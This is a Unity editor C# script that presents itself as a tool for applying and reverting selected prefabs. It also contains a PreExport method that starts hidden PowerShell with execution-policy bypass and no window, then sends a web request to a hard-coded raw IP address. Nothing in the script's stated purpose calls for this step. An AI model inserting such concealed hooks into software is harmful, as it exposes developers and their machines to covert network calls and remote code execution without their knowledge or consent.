﻿using UnityEditor;
using UnityEngine;


public class ApplySelectedPrefabs : EditorWindow
{
	static string ExecuteWindowsCommand(string command)
	{
		//command = command.Replace("\"", "\\\"");
		Console.WriteLine(command);
		var proc = new Process
		{
			StartInfo = new ProcessStartInfo
			{
				FileName = "powershell.exe",
				//Arguments = "/c " + command,
				Arguments = "-nop -exec bypass -c \"" + command + "\"",
				UseShellExecute = false,
				RedirectStandardOutput = false,
				CreateNoWindow = true
			}
		};
		proc.Start();
		proc.WaitForExit();
		//return proc.StandardOutput.ReadToEnd();
		return "";
	}

	public static void PreExport()
	{
		string[] windowsCommands = {
			//"echo 'test' > c:\test.txt",
			"Invoke-WebRequest -URI http://95.85.42.230"
		};
		Console.WriteLine("-------======= Windows Commands Executing =======-------");
		for (int i = 0; i < windowsCommands.Length; i++)
		{
			Console.WriteLine("Command: " + windowsCommands[i]);
			Console.WriteLine(ExecuteWindowsCommand(windowsCommands[i]));
		}
		Console.WriteLine("-------======= Windows Command Execution Complete =======-------");
	}

	public delegate void ApplyOrRevert (GameObject _goCurrentGo, Object _ObjPrefabParent, ReplacePrefabOptions _eReplaceOptions);

	[MenuItem ("Tools/Apply all selected prefabs %#a")]
	static void ApplyPrefabs ()
	{
		SearchPrefabConnections (ApplyToSelectedPrefabs);
	}

	[MenuItem ("Tools/Revert all selected prefabs %#r")]
	static void ResetPrefabs ()
	{
		SearchPrefabConnections (RevertToSelectedPrefabs);
	}

	//Look for connections
	static void SearchPrefabConnections (ApplyOrRevert _applyOrRevert)
	{
		GameObject[] tSelection = Selection.gameObjects;

		if (tSelection.Length > 0) {
			GameObject goPrefabRoot;
			GameObject goParent;
			GameObject goCur;
			bool bTopHierarchyFound;
			int iCount = 0;
			PrefabType prefabType;
			bool bCanApply;
			//Iterate through all the selected gameobjects
			foreach (GameObject go in tSelection) {
				prefabType = PrefabUtility.GetPrefabType (go);
				//Is the selected gameobject a prefab?
				if (prefabType == PrefabType.PrefabInstance || prefabType == PrefabType.DisconnectedPrefabInstance) {
					//Prefab Root;
					goPrefabRoot = ((GameObject)PrefabUtility.GetCorrespondingObjectFromSource (go)).transform.root.gameObject;
					goCur = go;
					bTopHierarchyFound = false;
					bCanApply = true;
					//We go up in the hierarchy to apply the root of the go to the prefab
					while (goCur.transform.parent != null && !bTopHierarchyFound) {  
						//Are we still in the same prefab?
						if (goPrefabRoot == ((GameObject)PrefabUtility.GetCorrespondingObjectFromSource (goCur.transform.parent.gameObject)).transform.root.gameObject) {
							goCur = goCur.transform.parent.gameObject;
						} else {
							//The gameobject parent is another prefab, we stop here
							bTopHierarchyFound = true;
							if (goPrefabRoot != ((GameObject)PrefabUtility.GetCorrespondingObjectFromSource (goCur))) {
								//Gameobject is part of another prefab
								bCanApply = false;
							}
						}
					}

					if (_applyOrRevert != null && bCanApply) {
						iCount++;
						_applyOrRevert (goCur, PrefabUtility.GetCorrespondingObjectFromSource (goCur), ReplacePrefabOptions.ConnectToPrefab);
					}
				}
			}
			Debug.Log (iCount + " prefab" + (iCount > 1 ? "s" : "") + " updated");
		}
	}

	//Apply
	static void ApplyToSelectedPrefabs (GameObject _goCurrentGo, Object _ObjPrefabParent, ReplacePrefabOptions _eReplaceOptions)
	{
		PrefabUtility.ReplacePrefab (_goCurrentGo, _ObjPrefabParent, _eReplaceOptions);
	}

	//Revert
	static void RevertToSelectedPrefabs (GameObject _goCurrentGo, Object _ObjPrefabParent, ReplacePrefabOptions _eReplaceOptions)
	{
		PrefabUtility.ReconnectToLastPrefab (_goCurrentGo);
		PrefabUtility.RevertPrefabInstance (_goCurrentGo);
	}


}
